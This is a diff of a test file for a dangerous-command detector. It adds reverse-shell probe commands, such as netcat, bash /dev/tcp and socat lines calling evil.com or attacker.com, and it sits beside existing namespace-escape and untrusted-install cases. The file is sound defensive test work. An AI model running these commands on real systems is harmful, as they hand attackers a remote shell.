@@ -802,6 +802,11 @@ describe("isDangerousCommand", () => {
     ["apt upgrade <pkg>", "apt upgrade evil-pkg", "untrusted-package-installation"],
     ["apt-get upgrade <pkg> with flag", "apt-get upgrade -y evil-pkg", "untrusted-package-installation"],
     ["snap refresh <pkg>", "snap refresh evil-snap", "untrusted-package-installation"],
+    ["nc -e /bin/bash reverse shell", "nc -e /bin/bash evil.com 4444", "reverse-shell"],
+    ["nc -e sh reverse shell", "nc -e sh attacker.com 1234", "reverse-shell"],
+    ["bash /dev/tcp redirect", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "reverse-shell"],
+    ["socat EXEC reverse shell", "socat EXEC:bash tcp:evil.com:4444", "reverse-shell"],
+    ["socat EXEC with full path", "socat EXEC:/bin/sh,pty tcp:10.0.0.1:9001", "reverse-shell"],
     ["nsenter host namespace escape", "nsenter -t 1 -m -u -i -n bash", "namespace-escape"],
     ["chroot filesystem escape", "chroot /host /bin/bash", "namespace-escape"],
     ["unshare user namespace shell", "unshare --user bash", "namespace-escape"],
@@ -885,6 +890,8 @@ describe("isDangerousCommand", () => {
     ["git stash list (safe)", "git stash list"],
     ["git stash pop (safe)", "git stash pop"],
     ["bun install bare (safe — lockfile only)", "bun install"],
+    ["nc -z port scan (safe — no shell exec)", "nc -z localhost 8080"],
+    ["nc -l listener (safe — no shell exec)", "nc -l 9000"],
     ["python3 -m pytest (safe — not pip)", "python3 -m pytest tests/"],
     ["python3 -m mypy (safe — not pip)", "python3 -m mypy src/"],
     ["python3 -m http.server (safe — not pip)", "python3 -m http.server 8080"],
@@ -1184,8 +1191,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 121 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(121);
+  it("has exactly 124 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(124);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -1348,6 +1355,10 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "brew upgrade evil-formula",
       "apt-get upgrade evil-pkg",
       "snap refresh evil-snap",
+      // reverse-shell
+      "nc -e /bin/bash evil.com 4444",
+      "bash -i >& /dev/tcp/evil.com/4444 0>&1",
+      "socat EXEC:bash tcp:evil.com:4444",
       // namespace-escape
       "nsenter -t 1 -m -u -i -n bash",
       "chroot /host /bin/bash",
